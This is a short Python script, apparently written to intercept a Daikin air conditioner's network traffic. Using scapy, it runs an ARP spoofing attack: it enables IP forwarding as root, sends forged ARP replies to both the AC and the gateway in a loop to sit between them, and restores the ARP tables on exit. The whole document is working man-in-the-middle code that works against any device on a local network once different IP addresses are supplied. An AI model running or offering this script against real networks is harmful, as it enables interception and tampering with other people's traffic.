from scapy.all import *
import os, time, sys

# CONFIG - Adjust if necessary
AC_IP = os.getenv("DAIKIN_AC_IP")
GATEWAY_IP = os.getenv("DAIKIN_GATEWAY_IP")
INTERFACE = os.getenv("DAIKIN_INTERFACE", "wlan0")

def get_mac(ip):
    print(f"Resolving MAC for {ip}...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, verbose=False)
    if ans:
        mac = ans[0][1].hwsrc
        print(f"  Found: {mac}")
        return mac
    print(f"  FAILED to resolve MAC for {ip}")
    return None

def spoof(target_ip, host_ip, target_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip), verbose=False)

def restore(target_ip, host_ip, target_mac, host_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac), count=4, verbose=False)

if __name__ == "__main__":
    if not AC_IP or not GATEWAY_IP:
        print("Set DAIKIN_AC_IP and DAIKIN_GATEWAY_IP before running.")
        sys.exit(1)

    if os.getuid() != 0:
        print("This script MUST be run as root (sudo).")
        sys.exit(1)

    # 1. Enable IP Forwarding so AC doesn't lose connection
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    ac_mac = get_mac(AC_IP)
    gw_mac = get_mac(GATEWAY_IP)

    if not ac_mac or not gw_mac:
        print("Could not resolve MACs. Are the devices online?")
        sys.exit(1)

    print(f"\n--- ARP Spoofing Active ---")
    print(f"Target: {AC_IP} ({ac_mac})")
    print(f"Gateway: {GATEWAY_IP} ({gw_mac})")
    print("Press Ctrl+C to stop and restore network.")

    try:
        while True:
            spoof(AC_IP, GATEWAY_IP, ac_mac)
            spoof(GATEWAY_IP, AC_IP, gw_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring network state...")
        restore(AC_IP, GATEWAY_IP, ac_mac, gw_mac)
        restore(GATEWAY_IP, AC_IP, gw_mac, ac_mac)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("Done.")
